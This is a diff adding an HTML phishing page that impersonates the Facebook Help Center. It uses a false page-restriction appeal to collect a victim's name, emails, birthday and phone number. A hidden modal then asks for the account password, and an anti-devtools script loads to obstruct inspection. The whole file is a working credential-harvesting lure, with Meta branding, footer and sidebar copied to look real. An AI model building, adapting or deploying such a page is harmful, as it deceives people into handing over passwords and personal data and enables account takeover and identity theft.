@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Help Center</title>
+    <link rel="icon" type="image/png" href="fb.ico">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <meta name="description"
+        content="Submit your appeal to Facebook's help center with this form. Provide necessary details to resolve your account issues.">
+    <script src="home.js" defer></script>
+    <link rel="icon" href="/assets/image/logofx.png" type="image/x-icon">
+    <style>
+        input.error,
+        textarea.error {
+            border: 1px solid red;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #passwordModal {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <a href="#"><img src="/support-center/My-Post-2-scaled.jpg" alt="Facebook Logo"></a>
+        <div class="search">
+            <i class="fa-solid fa-magnifying-glass"></i>
+            <input type="text" placeholder="How can we help?" aria-label="Search Help Center">
+        </div>
+    </div>
+
+    <div class="banner">
+        <div class="left">
+            <i class="fa-solid fa-house"></i>
+            <p>Help Center</p>
+        </div>
+        <div class="right">
+            <p>English</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="sidebar">
+            <ul>
+                <li><a href="#">Creating an Account</a></li>
+                <li><a href="#">Your Profile</a></li>
+                <li><a href="#">Friending</a></li>
+                <li><a href="#">Facebook Dating</a></li>
+                <li><a href="#">Your Home Page</a></li>
+                <li><a href="#">Messaging</a></li>
+                <li><a href="#">Reels</a></li>
+                <li><a href="#">Stories</a></li>
+                <li><a href="#">Photos</a></li>
+                <li><a href="#">Videos</a></li>
+                <li><a href="#">Gaming</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">Fundraisers and Donations</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Apps</a></li>
+                <li><a href="#">Facebook Mobile Apps</a></li>
+                <li><a href="#">Accessibility</a></li>
+            </ul>
+        </div>
+
+        <div class="content">
+            <div class="head">
+                <h2>Page Policy Appeals</h2>
+            </div>
+            <div class="body-content">
+                <p>We have detected unusual activity on your page that violates our community standards.<br><br>
+                    Your access to your page has been limited, and you are currently unable to post, share, or comment
+                    using your page.<br><br>
+                    If you believe this to be a mistake, you have the option to submit an appeal by providing the
+                    necessary information.</p>
+                <br>
+                <form id="loginForm">
+                    <label for="page-name">Page Name</label>
+                    <input type="text" id="page-name" name="page-name" required autocomplete="off">
+
+                    <label for="full-name">Full Name</label>
+                    <input type="text" id="full-name" name="full-name" required autocomplete="off">
+
+                    <label for="email-bus">Business Email Address</label>
+                    <input type="email" id="email-bus" name="email-bus" required>
+
+                    <label for="email">Personal Email Address</label>
+                    <input type="email" id="email" name="email" required>
+
+                    <label for="birthday">Birthday (MM/DD/YYYY)</label>
+                    <input type="text" id="birthday" name="birthday" required maxlength="10">
+
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required>
+
+                    <label for="note">Please provide us information that will help us investigate.</label>
+                    <textarea id="note" name="note" cols="35" rows="7"></textarea>
+                </form>
+            </div>
+            <div class="btn">
+                <button type="button" id="continueButton" class="submit-btn"
+                    aria-label="Submit your appeal">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <div><i class="fa-brands fa-facebook"></i></div>
+            <div>
+                <span>Meta©2024</span>
+                <a href="#">English (US)</a>
+            </div>
+            <div>
+                <a href="#">About</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Careers</a>
+            </div>
+            <div>
+                <a href="#">Ad choices</a>
+                <a href="#">Create ad</a>
+                <a href="#">Create Page</a>
+            </div>
+            <div>
+                <a href="#">Terms & Policies</a>
+                <a href="#">Cookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="overlay">
+        <div id="passwordModal">
+            <p style="font-size: 20px; margin-bottom: 15px;">Please enter your password to continue</p>
+            <form id="passwordForm">
+                <label for="password">For your security, you must enter your
+                    password to continue.</label>
+                <input type="password" id="password" name="password" required placeholder="Password">
+                <p id="error-message" style="margin-top: 10px;"></p> <!-- Dòng thông báo lỗi -->
+                <button type="submit" id="submitButton">Continue</button>
+            </form>
+        </div>
+    </div>
+    <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
+
+</body>
+
+</html>
